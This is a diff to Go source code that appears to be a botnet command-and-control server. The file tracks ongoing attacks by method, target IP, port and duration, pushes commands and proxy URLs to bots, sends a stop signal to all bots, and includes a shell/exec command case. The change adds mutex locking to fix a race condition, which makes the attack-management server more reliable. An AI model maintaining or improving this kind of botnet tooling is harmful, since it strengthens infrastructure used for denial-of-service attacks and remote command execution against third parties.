@@ -387,19 +387,24 @@ func handleRequest(conn net.Conn) {
 					}
 					conn.Write([]byte("\r\n"))
 
-					ongoingAttacks[conn] = attack{
+					a := attack{
 						method:   method,
 						ip:       ip,
 						port:     port,
 						duration: dur,
 						start:    time.Now(),
 					}
+					ongoingAttacksLock.Lock()
+					ongoingAttacks[conn] = a
+					ongoingAttacksLock.Unlock()
 
-					go func(conn net.Conn, attack attack) {
-						time.Sleep(attack.duration)
+					go func(conn net.Conn, a attack) {
+						time.Sleep(a.duration)
+						ongoingAttacksLock.Lock()
 						delete(ongoingAttacks, conn)
+						ongoingAttacksLock.Unlock()
 						conn.Write([]byte("\033[38;5;46m✓ Attack completed and removed.\033[0m\n"))
-					}(conn, ongoingAttacks[conn])
+					}(conn, a)
 
 					// Build command string - send proxy URL to bots (they fetch & rotate without validation)
 					if proxyMode && proxyURL != "" {
@@ -415,10 +420,12 @@ func handleRequest(conn net.Conn) {
 						continue
 					}
 					// Clear all ongoing attacks
+					ongoingAttacksLock.Lock()
 					count := len(ongoingAttacks)
 					for k := range ongoingAttacks {
 						delete(ongoingAttacks, k)
 					}
+					ongoingAttacksLock.Unlock()
 					// Send stop to all bots
 					sendToBots("!stop")
 					conn.Write([]byte(fmt.Sprintf("\033[38;5;46m✓ Stopped %d attack(s). Kill signal sent to all bots.\033[0m\r\n", count)))
@@ -430,6 +437,7 @@ func handleRequest(conn net.Conn) {
 					}
 					// Show ongoing attacks
 					conn.Write([]byte("Ongoing Attacks:\r\n"))
+					ongoingAttacksLock.RLock()
 					for _, attack := range ongoingAttacks {
 						remaining := time.Until(attack.start.Add(attack.duration))
 						if remaining > 0 {
@@ -437,6 +445,7 @@ func handleRequest(conn net.Conn) {
 								attack.method, attack.ip, attack.port, remaining.Round(time.Second))))
 						}
 					}
+					ongoingAttacksLock.RUnlock()
 
 				case "!shell", "!exec":
 					if !c.canUseShell() {
